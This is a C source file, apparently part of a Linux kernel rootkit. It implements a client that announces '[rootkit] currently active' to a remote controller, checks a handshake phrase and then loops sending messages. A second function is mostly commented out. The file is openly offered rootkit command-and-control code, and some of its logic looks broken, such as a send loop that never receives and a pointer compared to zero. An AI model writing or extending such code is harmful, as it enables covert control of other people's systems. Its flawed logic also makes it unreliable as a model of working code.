#include <linux/string.h>
#include <custom/networking.c>

static int client_handler(void){
	memset(client.message, 0, sizeof(client.message)); //zeroes out message buffer
	strcpy(client.message, "[rootkit] currently active"); //copies basic auth message into buffer
	net_send();
	net_recv();
	if (strcmp("Command has been expecting you...", client.message)!=0){ //if received message is not same as expected
		printk(KERN_DEBUG "[rootkit] handle_client: client is a fake\n%s", client.message); //print debug info
		return -1; //return -1 for error
	}
	while(true){
		if(strlen(client.message)>0){
			net_send();
			memset(client.message, 0, sizeof(client.message)); //zeroes out message buffer
		}
	}
	return 0; //return 0 for no errors
}

static int client_print(char *message){
	/*
	while(true){ //infinite loop that waits till able to write to message
		if(message==0){ //if able to write to message because no current message
			strcpy(client.message, message); //copies basic auth message into buffer
			return 0; //returns
		}
		printk("message to be printed = %s     message length = %i", message, strlen(client.message));
	}
	*/
	//strcpy(client.message, message);
	//net_send();
	return 0;
}
